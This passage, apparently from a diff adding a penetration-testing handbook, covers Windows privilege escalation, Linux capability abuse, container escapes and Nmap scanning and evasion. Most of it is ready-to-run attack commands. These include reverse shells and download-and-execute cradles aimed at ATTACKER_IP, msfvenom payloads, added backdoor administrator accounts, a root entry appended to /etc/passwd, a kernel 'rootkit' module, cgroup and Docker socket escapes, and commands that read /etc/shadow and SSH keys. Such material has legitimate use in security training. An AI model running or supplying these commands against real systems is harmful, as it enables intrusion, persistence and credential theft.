+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.5
+set LPORT 4444
+exploit
+```
+
+### Verification Post-Exploitation
+
+**Check if user was added to administrators:**
+
+```cmd
+net localgroup administrators
+```
+
+**Verify privileges:**
+
+```cmd
+whoami /priv
+whoami /groups
+```
+
+### Defense Detection
+
+**Registry monitoring for these keys:**
+
+```powershell
+# Set up audit policy
+auditpol /set /subcategory:"Registry" /success:enable /failure:enable
+
+# Monitor MSI installations
+Get-WinEvent -LogName Application | Where-Object {$_.ProviderName -eq "MsiInstaller"}
+```
+
+---
+
+## Token Manipulation
+
+Token manipulation exploits Windows access token mechanisms to elevate privileges by impersonating higher-privileged users or processes.
+
+### Access Token Fundamentals
+
+Windows access tokens contain security context information: user SID, group memberships, privilege assignments, and integrity levels. Tokens are assigned at logon and inherited by child processes. Two primary token types exist: primary tokens (associated with processes) and impersonation tokens (for thread-level operations).
+
+### SeImpersonatePrivilege Exploitation
+
+When a user has `SeImpersonatePrivilege`, they can impersonate any token they can obtain a handle to. This privilege is commonly assigned to service accounts (IIS, MSSQL, network service accounts).
+
+**Enumeration:**
+
+```bash
+# Check current user privileges
+whoami /priv
+
+# Look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
+```
+
+**JuicyPotato Exploitation (Windows Server 2016 and earlier):**
+
+```bash
+# Basic execution
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > c:\temp\out.txt" -t *
+
+# With specific CLSID
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add" -t * -c {CLSID}
+
+# Reverse shell
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass -c IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')" -t *
+```
+
+Parameters:
+
+- `-l`: COM server listening port
+- `-p`: Program to launch
+- `-a`: Arguments for program
+- `-t`: createprocess call (use * for auto)
+- `-c`: CLSID (COM object identifier)
+
+**[Unverified]** CLSID selection varies by Windows version and installed software. Test multiple CLSIDs from JuicyPotato's repository.
+
+**PrintSpoofer/RoguePotato (Windows Server 2019+):**
+
+```bash
+# PrintSpoofer (simpler, works on Server 2019+)
+PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')"
+
+# RoguePotato (requires redirector setup)
+# On attacker machine - redirect port 135
+socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999
+
+# On target
+RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999
+```
+
+**GodPotato (Windows Server 2012-2022):**
+
+```bash
+# Basic command execution
+GodPotato.exe -cmd "cmd /c whoami"
+
+# Add administrator user
+GodPotato.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
+```
+
+### Token Theft and Impersonation
+
+**Using Incognito (Metasploit):**
+
+```bash
+# Within meterpreter session
+load incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\\SYSTEM"
+```
+
+**Manual Token Impersonation (PowerShell):**
+
+```powershell
+# Requires SeDebugPrivilege
+$ProcessId = (Get-Process lsass).Id
+$hProcess = [Kernel32]::OpenProcess(0x1F0FFF, $false, $ProcessId)
+[Advapi32]::OpenProcessToken($hProcess, 0x02, [ref]$hToken)
+[Advapi32]::DuplicateToken($hToken, 2, [ref]$hDupToken)
+[Advapi32]::ImpersonateLoggedOnUser($hDupToken)
+```
+
+### Named Pipe Impersonation
+
+Services connecting to attacker-controlled named pipes can have their tokens captured.
+
+```bash
+# Create malicious named pipe service
+# C++ or C# implementation required - pseudocode approach
+# 1. Create named pipe
+# 2. Trigger service connection
+# 3. Impersonate connecting client
+
+# Using PipeViewer enumeration
+pipelist.exe /accepteula
+
+# Exploitation typically requires custom tooling or Metasploit modules
+```
+
+## Scheduled Task Exploitation
+
+Scheduled tasks running with elevated privileges that have weak permissions or modifiable components.
+
+### Task Enumeration
+
+```bash
+# List all scheduled tasks
+schtasks /query /fo LIST /v
+
+# More detailed output
+schtasks /query /fo LIST /v > tasks.txt
+
+# PowerShell enumeration
+Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select TaskName,TaskPath,State
+
+# Check task permissions
+icacls C:\Windows\System32\Tasks\
+
+# View specific task XML
+type C:\Windows\System32\Tasks\TASKNAME
+```
+
+### Writable Task Binary Exploitation
+
+**Identify writable executables:**
+
+```bash
+# Check permissions on task executable
+icacls "C:\Path\To\Scheduled\Binary.exe"
+
+# Look for (F)ull or (M)odify permissions
+# F = Full control
+# M = Modify
+# W = Write
+```
+
+**Replace binary:**
+
+```bash
+# Backup original
+move C:\Path\To\Binary.exe C:\Path\To\Binary.exe.bak
+
+# Replace with malicious executable
+# Generate payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
+
+# Transfer and replace
+copy shell.exe C:\Path\To\Binary.exe
+
+# Wait for scheduled execution or trigger manually
+schtasks /run /tn "TaskName"
+```
+
+### Task XML Modification
+
+If task XML files are writable, modify the action element:
+
+```bash
+# Export task
+schtasks /query /tn "TaskName" /xml > task.xml
+
+# Modify <Command> and <Arguments> elements
+# Example modification:
+<Exec>
+  <Command>cmd.exe</Command>
+  <Arguments>/c powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')"</Arguments>
+</Exec>
+
+# Delete and recreate task
+schtasks /delete /tn "TaskName" /f
+schtasks /create /tn "TaskName" /xml task.xml
+```
+
+### DLL Hijacking in Scheduled Tasks
+
+**Identify missing DLLs:**
+
+```bash
+# Use Process Monitor (procmon.exe) to observe task execution
+# Filter: Operation is CreateFile, Result is NAME NOT FOUND, Path ends with .dll
+
+# Alternative: use listdlls
+listdlls.exe -u TaskExecutable.exe
+```
+
+**Exploitation:**
+
+```bash
+# Generate malicious DLL
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o malicious.dll
+
+# Place in writable directory in DLL search order
+# Common locations:
+# - Application directory
+# - C:\Windows\System32 (if writable)
+# - C:\Windows\System
+# - Current directory
+# - %PATH% directories
+
+copy malicious.dll C:\Writable\Path\target.dll
+```
+
+### AlwaysInstallElevated with Scheduled Tasks
+
+If `AlwaysInstallElevated` is enabled, MSI installers run as SYSTEM.
+
+```bash
+# Check registry
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Both must be set to 1
+
+# Create malicious MSI
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi
+
+# Create scheduled task to execute MSI
+schtasks /create /tn "UpdateTask" /tr "msiexec /quiet /qn /i C:\Temp\shell.msi" /sc onlogon /ru System
+```
+
+## Capability Exploitation (Linux)
+
+Linux capabilities provide fine-grained privilege division, splitting root privileges into distinct units. Misconfigured capabilities can enable privilege escalation.
+
+### Capability Enumeration
+
+```bash
+# List files with capabilities
+getcap -r / 2>/dev/null
+
+# Check specific file
+getcap /path/to/binary
+
+# List all possible capabilities
+capsh --print
+```
+
+### Exploitable Capabilities
+
+**CAP_SETUID**
+
+Allows arbitrary UID changes, enabling direct escalation to root.
+
+```bash
+# If Python has cap_setuid
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# If Perl has cap_setuid
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+# Custom C program
+cat > setuid.c << EOF
+#include <unistd.h>
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/bash", "bash", NULL);
+    return 0;
+}
+EOF
+gcc setuid.c -o setuid
+./setuid
+```
+
+**CAP_DAC_READ_SEARCH**
+
+Bypasses file read permission checks and directory search restrictions.
+
+```bash
+# Read sensitive files
+# If tar has this capability
+cd /
+tar czf /tmp/shadow.tar.gz etc/shadow
+cd /tmp
+tar xzf shadow.tar.gz
+cat etc/shadow
+
+# Using Python
+python3 << EOF
+with open("/etc/shadow", "r") as f:
+    print(f.read())
+EOF
+
+# Read SSH keys
+tar czf /tmp/root_ssh.tar.gz root/.ssh/id_rsa
+```
+
+**CAP_DAC_OVERRIDE**
+
+Bypasses file read, write, and execute permission checks.
+
+```bash
+# Write to /etc/passwd
+# If Python has cap_dac_override
+python3 -c 'open("/etc/passwd", "a").write("hacker:x:0:0::/root:/bin/bash\n")'
+
+# Modify sudoers
+echo "user ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/user
+
+# Replace authorized_keys
+echo "YOUR_SSH_PUBLIC_KEY" > /root/.ssh/authorized_keys
+```
+
+**CAP_CHOWN**
+
+Allows arbitrary ownership changes.
+
+```bash
+# Take ownership of sensitive files
+# If Python has cap_chown
+python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
+
+# Take ownership of SUID binary directory
+chown -R user:user /usr/bin/
+# Then replace SUID binary
+```
+
+**CAP_FOWNER**
+
+Bypasses permission checks on file operations where the filesystem UID must match file owner UID.
+
+```bash
+# Modify SUID binary permissions
+# If binary has cap_fowner
+chmod u+s /usr/bin/less
+
+# Modify crontab files
+echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /etc/crontab
+```
+
+**CAP_SYS_ADMIN**
+
+Extremely powerful capability enabling numerous exploitation paths including mounting filesystems.
+
+```bash
+# Mount host filesystem from container
+mkdir /mnt/host
+mount -t auto /dev/sda1 /mnt/host
+chroot /mnt/host
+
+# Access host resources
+cat /mnt/host/etc/shadow
+```
+
+**CAP_SYS_PTRACE**
+
+Allows process memory injection and debugging.
+
+```bash
+# Inject shellcode into root process
+# Requires custom exploit or tools like ptraceInjector
+
+# Basic approach - attach to root process and manipulate
+gdb -p ROOT_PID
+(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
+
+# Using Python ptrace
+python3 << EOF
+import ptrace.debugger
+pid = ROOT_PROCESS_PID
+debugger = ptrace.debugger.PtraceDebugger()
+process = debugger.addProcess(pid, False)
+# Inject shellcode here
+EOF
+```
+
+**CAP_SYS_MODULE**
+
+Allows kernel module loading.
+
+```bash
+# Create malicious kernel module
+cat > rootkit.c << EOF
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/cred.h>
+
+static int __init rootkit_init(void) {
+    struct cred *creds = prepare_creds();
+    creds->uid.val = 0;
+    creds->gid.val = 0;
+    creds->euid.val = 0;
+    creds->egid.val = 0;
+    commit_creds(creds);
+    return 0;
+}
+
+static void __exit rootkit_exit(void) {}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+MODULE_LICENSE("GPL");
+EOF
+
+# Compile
+make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
+
+# Load module
+insmod rootkit.ko
+
+# Spawn root shell
+bash
+```
+
+### Capability-Based Binary Exploitation
+
+**[Unverified]** Exploitation success depends on how the binary uses its capabilities and what functionality it exposes.
+
+```bash
+# General pattern for interpreted language binaries with caps
+# Python example
+/usr/bin/python3.x -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'
+
+# Ruby
+/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
+
+# Node.js (if has cap_setuid)
+/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: "inherit"})'
+```
+
+## Container Escape Techniques
+
+### Docker Socket Exposure
+
+When Docker socket is mounted inside container (`/var/run/docker.sock`).
+
+```bash
+# Check for Docker socket
+ls -la /var/run/docker.sock
+
+# Install Docker client inside container
+curl -fsSL https://get.docker.com -o get-docker.sh
+sh get-docker.sh
+
+# Or use static binary
+wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz
+tar xzvf docker-20.10.9.tgz
+cp docker/docker /usr/bin/
+
+# List host containers
+docker -H unix:///var/run/docker.sock ps -a
+
+# Create privileged container with host filesystem mounted
+docker -H unix:///var/run/docker.sock run -it --rm --privileged --pid=host --net=host -v /:/host alpine chroot /host
+
+# Alternative: run with specific host path mount
+docker -H unix:///var/run/docker.sock run -it --rm -v /:/mnt alpine
+
+# In new container
+chroot /mnt
+# Now on host filesystem
+cat /etc/shadow
+```
+
+### Privileged Container Escape
+
+Privileged containers have nearly all capabilities and can access host devices.
+
+```bash
+# Check if running privileged
+ip link add dummy0 type dummy 2>/dev/null && echo "Privileged" || echo "Not privileged"
+
+# Check capabilities
+capsh --print
+
+# Method 1: Direct device access
+# List block devices
+fdisk -l
+
+# Mount host filesystem
+mkdir /mnt/host
+mount /dev/sda1 /mnt/host
+chroot /mnt/host
+
+# Method 2: cgroup release_agent exploitation
+# Check if vulnerable
+cat /proc/1/cgroup
+# Look for cgroup mount point
+
+# Create payload
+mkdir /tmp/exploit
+echo '#!/bin/bash' > /tmp/exploit/payload.sh
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /tmp/exploit/payload.sh
+chmod +x /tmp/exploit/payload.sh
+
+# Exploit cgroup release_agent
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/tmp/exploit/payload.sh" > /tmp/cgrp/release_agent
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+### CAP_SYS_ADMIN Container Escape
+
+Containers with `CAP_SYS_ADMIN` can mount filesystems and exploit cgroups.
+
+```bash
+# Verify capability
+capsh --print | grep sys_admin
+
+# cgroup notify_on_release exploit
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+
+# Create reverse shell payload on host (path relative to host)
+cat > /cmd << EOF
+#!/bin/sh
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+EOF
+chmod a+x /cmd
+
+# Trigger release agent
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+### Writable /var/run/docker.sock with curl
+
+When Docker socket exists but Docker client unavailable.
+
+```bash
+# Create container with host mount via API
+curl -X POST --unix-socket /var/run/docker.sock \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}' \
+  http://localhost/containers/create
+
+# Returns container ID: {"Id":"CONTAINER_ID",...}
+
+# Start container
+curl -X POST --unix-socket /var/run/docker.sock \
+  http://localhost/containers/CONTAINER_ID/start
+
+# Execute command in container
+curl -X POST --unix-socket /var/run/docker.sock \
+  -H "Content-Type: application/json" \
+  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","bash","-c","cat /etc/shadow"]}' \
+  http://localhost/containers/CONTAINER_ID/exec
+
+# Get exec ID and start
+curl -X POST --unix-socket /var/run/docker.sock \
+  http://localhost/exec/EXEC_ID/start
+```
+
+### Kubernetes Container Escape
+
+**Service Account Token Access:**
+
+```bash
+# Service account token location
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# API server endpoint
+APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
+
+# Query API
+curl -H "Authorization: Bearer $TOKEN" --insecure $APISERVER/api/v1/namespaces/default/pods
+
+# Check permissions
+curl -H "Authorization: Bearer $TOKEN" --insecure \
+  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
+  -X POST -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'
+```
+
+**Host Path Mount Exploitation:**
+
+```bash
+# Check for host mounts
+mount | grep "/host"
+df -h
+
+# If host path mounted
+chroot /hostpath
+```
+
+**Creating Privileged Pod (if permissions allow):**
+
+```bash
+cat > privpod.yaml << EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privpod
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: privcontainer
+    image: alpine
+    command: ["/bin/sh"]
+    args: ["-c", "nsenter --mount=/proc/1/ns/mnt -- /bin/bash"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+EOF
+
+# Apply with kubectl or via API
+curl -H "Authorization: Bearer $TOKEN" --insecure \
+  -H "Content-Type: application/yaml" \
+  -X POST --data-binary @privpod.yaml \
+  $APISERVER/api/v1/namespaces/default/pods
+```
+
+### runC Container Escape (CVE-2019-5736)
+
+Exploits vulnerability in runC allowing malicious container to overwrite host runC binary.
+
+```bash
+# Clone exploit
+git clone https://github.com/Frichetten/CVE-2019-5736-PoC
+cd CVE-2019-5736-PoC
+
+# Modify payload in main.go
+# Change payload variable to desired command
+
+# Compile
+CGO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' .
+
+# Transfer to container
+# Execute in container - wait for host to exec into container
+./CVE-2019-5736-PoC
+```
+
+### Namespace Breakout Techniques
+
+**PID Namespace Escape:**
+
+```bash
+# Check if in PID namespace
+ls -la /proc/1/root
+
+# If /proc/1/root is host root
+ls /proc/1/root
+
+# Access host filesystem
+cat /proc/1/root/etc/shadow
+
+# Execute on host via /proc
+echo "payload" > /proc/1/root/tmp/.payload
+```
+
+**Mount Namespace Manipulation:**
+
+```bash
+# If CAP_SYS_ADMIN or privileged
+nsenter --mount=/proc/1/ns/mnt -- /bin/bash
+
+# Now in host mount namespace
+```
+
+### LXC/LXD Container Escape
+
+**LXD Group Privilege Escalation:**
+
+```bash
+# Check if user in lxd group
+id
+
+# Initialize LXD if needed
+lxd init
+
+# Download Alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+./build-alpine
+
+# Import image
+lxc image import ./alpine*.tar.gz --alias alpine
+
+# Create privileged container with host disk
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+
+# In container
+cd /mnt/root/root
+cat .ssh/id_rsa
+```
+
+---
+
+**Important Related Topics:**
+
+- **Windows Token Privileges**: SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege exploitation
+- **Linux Namespace Internals**: Understanding PID, mount, network, UTS namespaces for container security
+- **Kernel Exploitation**: When capabilities and container escapes fail, kernel vulnerabilities provide alternate paths
+- **Process Injection Techniques**: Complementary to token manipulation for post-exploitation
+- **Seccomp/AppArmor Bypass**: Additional container security layers that may require circumvention
+
+---
+
+# Mastery (Kali Linux Specific)
+
+## Nmap Advanced Usage
+
+Nmap is the definitive network reconnaissance tool. Mastery requires understanding packet crafting, timing strategies, NSE scripting, and evasion techniques.
+
+### Core Scanning Techniques
+
+**TCP Scan Methods:**
+
+```bash
+# TCP SYN scan (default, requires root)
+nmap -sS target_ip
+
+# TCP Connect scan (no root required)
+nmap -sT target_ip
+
+# TCP ACK scan (firewall rule mapping)
+nmap -sA target_ip
+
+# TCP Window scan (BSD systems differentiation)
+nmap -sW target_ip
+
+# TCP Maimon scan (FIN/ACK probe)
+nmap -sM target_ip
+
+# TCP Null scan (no flags set)
+nmap -sN target_ip
+
+# TCP FIN scan
+nmap -sF target_ip
+
+# TCP Xmas scan (FIN, PSH, URG flags)
+nmap -sX target_ip
+```
+
+**UDP and Protocol Scans:**
+
+```bash
+# UDP scan (slow but critical)
+nmap -sU target_ip
+
+# Fast UDP scan (top 100 ports)
+nmap -sU --top-ports 100 target_ip
+
+# Combined TCP/UDP scan
+nmap -sS -sU -p T:80,443,U:53,161 target_ip
+
+# IP Protocol scan
+nmap -sO target_ip
+
+# SCTP INIT scan
+nmap -sY target_ip
+```
+
+### Port Specification and Range Control
+
+```bash
+# Specific ports
+nmap -p 22,80,443,3389 target_ip
+
+# Port ranges
+nmap -p 1-1000 target_ip
+nmap -p- target_ip  # All 65535 ports
+
+# Top N ports
+nmap --top-ports 1000 target_ip
+
+# Protocol-specific ports
+nmap -p T:80,443,U:53,161 target_ip
+
+# Exclude ports
+nmap -p 1-1000 --exclude-ports 22,80 target_ip
+
+# Fast scan (100 most common ports)
+nmap -F target_ip
+```
+
+### Host Discovery Methods
+
+```bash
+# Ping sweep
+nmap -sn 192.168.1.0/24
+
+# No ping (skip host discovery)
+nmap -Pn target_ip
+
+# TCP SYN ping
+nmap -PS22,80,443 target_ip
+
+# TCP ACK ping
+nmap -PA80,443 target_ip
+
+# UDP ping
+nmap -PU53,161 target_ip
+
+# ICMP ping types
+nmap -PE target_ip  # Echo request
+nmap -PP target_ip  # Timestamp request
+nmap -PM target_ip  # Netmask request
+
+# ARP ping (local network only)
+nmap -PR 192.168.1.0/24
+
+# Combined discovery
+nmap -PS22,80,443 -PA80,443 -PU53 target_ip
+
+# Treat all as online
+nmap -Pn -p- target_ip
+```
+
+### Service and Version Detection
+
+```bash
+# Service version detection
+nmap -sV target_ip
+
+# Version intensity (0-9, default 7)
+nmap -sV --version-intensity 9 target_ip
+nmap -sV --version-light target_ip  # Intensity 2
+
+# Version detection with scripts
+nmap -sV -sC target_ip
+
+# Aggressive scan (OS, version, scripts, traceroute)
+nmap -A target_ip
+
+# OS detection only
+nmap -O target_ip
+
+# Aggressive OS detection
+nmap -O --osscan-guess target_ip
+nmap -O --osscan-limit target_ip  # Limit to promising targets
+
+# Service probe list
+nmap -sV --allports target_ip  # Don't exclude any ports
+
+# RPC service info
+nmap -sV --version-trace target_ip
+```
+
+### Timing and Performance
+
+**Timing Templates (T0-T5):**
+
+```bash
+# Paranoid - IDS evasion (5 min per probe)
+nmap -T0 target_ip
+
+# Sneaky - IDS evasion (15 sec per probe)
+nmap -T1 target_ip
+
+# Polite - reduced network load
+nmap -T2 target_ip
+
+# Normal - default timing
+nmap -T3 target_ip
+
+# Aggressive - fast, reliable networks
+nmap -T4 target_ip
+
+# Insane - very fast, may miss results
+nmap -T5 target_ip
+```
+
+**Manual Timing Control:**
+
+```bash
+# Minimum RTT timeout (milliseconds)
+nmap --min-rtt-timeout 100ms target_ip
+
+# Maximum RTT timeout
+nmap --max-rtt-timeout 1000ms target_ip
+
+# Initial RTT timeout
+nmap --initial-rtt-timeout 500ms target_ip
+
+# Maximum retries
+nmap --max-retries 3 target_ip
+
+# Host timeout
+nmap --host-timeout 30m target_ip
+
+# Scan delay (milliseconds between probes)
+nmap --scan-delay 1s target_ip
+nmap --max-scan-delay 2s target_ip
+
+# Parallelism
+nmap --min-parallelism 10 --max-parallelism 100 target_ip
+
+# Rate limiting (packets per second)
+nmap --min-rate 100 target_ip
+nmap --max-rate 1000 target_ip
+```
+
+### NSE (Nmap Scripting Engine)
+
+**Script Categories:**
+
+```bash
+# Default safe scripts
+nmap -sC target_ip
+nmap --script=default target_ip
+
+# All scripts (dangerous, can crash services)
+nmap --script=all target_ip
+
+# Specific category
+nmap --script=vuln target_ip
+nmap --script=exploit target_ip
+nmap --script=auth target_ip
+nmap --script=brute target_ip
+nmap --script=discovery target_ip
+nmap --script=safe target_ip
+
+# Multiple categories
+nmap --script="vuln and safe" target_ip
+nmap --script="not intrusive" target_ip
+
+# Specific script
+nmap --script=http-enum target_ip
+nmap --script=smb-vuln-ms17-010 target_ip
+
+# Multiple scripts
+nmap --script=http-enum,http-headers,http-title target_ip
+
+# Wildcard
+nmap --script="http-*" target_ip
+nmap --script="smb-vuln-*" target_ip
+```
+
+**Script Arguments:**
+
+```bash
+# Pass arguments to scripts
+nmap --script=http-enum --script-args http-enum.basepath='/admin/' target_ip
+
+# Multiple arguments
+nmap --script=mysql-brute --script-args userdb=/usr/share/wordlists/users.txt,passdb=/usr/share/wordlists/passwords.txt target_ip
+
+# Script help
+nmap --script-help=http-enum
+
+# Update script database
+nmap --script-updatedb
+```
+
+**Common Useful Scripts:**
+
+```bash
+# SMB vulnerability scanning
+nmap --script=smb-vuln-ms17-010 -p445 target_ip
+nmap --script=smb-vuln-* -p445 target_ip
+
+# SMB enumeration
+nmap --script=smb-enum-shares,smb-enum-users -p445 target_ip
+nmap --script=smb-os-discovery -p445 target_ip
+
+# HTTP enumeration
+nmap --script=http-enum -p80,443 target_ip
+nmap --script=http-headers,http-methods,http-title -p80 target_ip
+nmap --script=http-shellshock --script-args uri=/cgi-bin/test.sh -p80 target_ip
+
+# SSL/TLS testing
+nmap --script=ssl-enum-ciphers -p443 target_ip
+nmap --script=ssl-heartbleed -p443 target_ip
+nmap --script=ssl-cert -p443 target_ip
+
+# DNS enumeration
+nmap --script=dns-brute --script-args dns-brute.domain=example.com target_ip
+nmap --script=dns-zone-transfer --script-args dns-zone-transfer.domain=example.com target_ip
+
+# SSH auditing
+nmap --script=ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -p22 target_ip
+nmap --script=ssh-brute -p22 target_ip
+
+# FTP enumeration
+nmap --script=ftp-anon,ftp-bounce -p21 target_ip
+
+# SNMP enumeration
+nmap --script=snmp-brute,snmp-interfaces,snmp-processes -p161 target_ip
+
+# MySQL enumeration
+nmap --script=mysql-enum,mysql-databases,mysql-variables -p3306 target_ip
+
+# RDP security
+nmap --script=rdp-enum-encryption,rdp-vuln-ms12-020 -p3389 target_ip
+
+# Broadcast discovery
+nmap --script=broadcast-dhcp-discover
+nmap --script=broadcast-dns-service-discovery
+```
+
+### Firewall and IDS Evasion
+
+**Fragmentation:**
+
+```bash
+# Fragment packets (8 bytes)
+nmap -f target_ip
+
+# Custom fragment size (must be multiple of 8)
+nmap --mtu 16 target_ip
+nmap --mtu 24 target_ip
+```
+
+**Decoy Scanning:**
+
+```bash
+# Random decoys
+nmap -D RND:10 target_ip
+
+# Specific decoys
+nmap -D decoy1,decoy2,ME,decoy3 target_ip
+
+# Your IP position (ME) can be placed anywhere
+nmap -D 192.168.1.5,192.168.1.6,ME,192.168.1.7 target_ip
+```
+
+**Source Port Manipulation:**
+
+```bash
+# Spoof source port (common allowed ports)
+nmap --source-port 53 target_ip
+nmap -g 53 target_ip
+
+# Common allowed ports: 20, 53, 80, 443
+nmap --source-port 80 target_ip
+```
+
+**MAC Address Spoofing:**
+
+```bash
+# Spoof MAC address
+nmap --spoof-mac 0 target_ip  # Random MAC
+nmap --spoof-mac Dell target_ip  # Dell vendor
+nmap --spoof-mac 00:11:22:33:44:55 target_ip  # Specific MAC
+```
+
+**Data Length and Randomization:**
+
+```bash
+# Append random data
+nmap --data-length 25 target_ip
+
+# Randomize target order
+nmap --randomize-hosts target1 target2 target3
+
+# Bad checksum (firewall might not calculate)
+nmap --badsum target_ip
+```
+
+**Idle Scan (Zombie Scan):**
+
+```bash
+# Use zombie host for scanning
+nmap -sI zombie_ip target_ip
+
+# Verify zombie suitability
+nmap -O -v zombie_ip
+```
+
+**Advanced Evasion:**
+
+```bash
+# Custom TTL
+nmap --ttl 64 target_ip
+
+# IP options
+nmap --ip-options "L 192.168.1.1 192.168.1.2" target_ip
+
+# Send packets with specified IP options
+nmap --ip-options "R" target_ip  # Record route
+nmap --ip-options "T" target_ip  # Timestamp
+```
+
+### Output Formats
+
+```bash
+# Normal output
+nmap -oN scan_results.txt target_ip
+
+# XML output
+nmap -oX scan_results.xml target_ip
+
+# Grepable output
+nmap -oG scan_results.gnmap target_ip
+
+# Script kiddie output
+nmap -oS scan_results.skid target_ip
+
+# All formats
+nmap -oA scan_results target_ip
+
+# Append to existing file
+nmap --append-output -oN scan_results.txt target_ip
+
+# Verbose output
+nmap -v target_ip
+nmap -vv target_ip  # Very verbose
+
+# Debugging
+nmap -d target_ip
+nmap -dd target_ip  # More debugging
+```
+
+### Practical Scanning Strategies
+
+**Initial Network Sweep:**
+
+```bash
+# Quick host discovery
+nmap -sn -T4 192.168.1.0/24 -oG live_hosts.txt
+
+# Extract live IPs
+grep "Up" live_hosts.txt | cut -d " " -f 2 > targets.txt
+```
+
+**Fast Port Scan:**
+
+```bash
+# Top 1000 ports, all live hosts
+nmap -iL targets.txt -T4 --top-ports 1000 -oA fast_scan
+
+# SYN scan common ports
+nmap -iL targets.txt -sS -T4 -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 -oA common_ports
+```
+
+**Comprehensive Scan:**
+
+```bash
+# All TCP ports with version detection
+nmap -iL targets.txt -p- -sV -T4 -oA full_tcp
+
+# Add UDP top ports
+nmap -iL targets.txt -sU --top-ports 100 -sV -T4 -oA top_udp
+```
+
+**Vulnerability Scan:**
+
+```bash
+# Vuln scripts on discovered services
+nmap -iL targets.txt -sV --script=vuln -T4 -oA vuln_scan
+
+# Specific service vulnerabilities
+nmap -p 445 --script=smb-vuln-* 192.168.1.0/24 -oA smb_vulns
+nmap -p 80,443 --script=http-vuln-* 192.168.1.0/24 -oA http_vulns
+```
+
+**Stealth Scan:**
+
+```bash
+# Slow, fragmented, with decoys
+nmap -sS -T1 -f -D RND:10 --randomize-hosts -p 80,443 target_ip -oN stealth_scan.txt
+
+# Idle scan through zombie
+nmap -Pn -sI zombie_ip -p- target_ip
+```
+
+### Nmap with Proxychains
+
+```bash
+# Scan through SOCKS proxy
+proxychains nmap -sT -Pn target_ip
+
+# Note: Only TCP Connect (-sT) works with proxychains
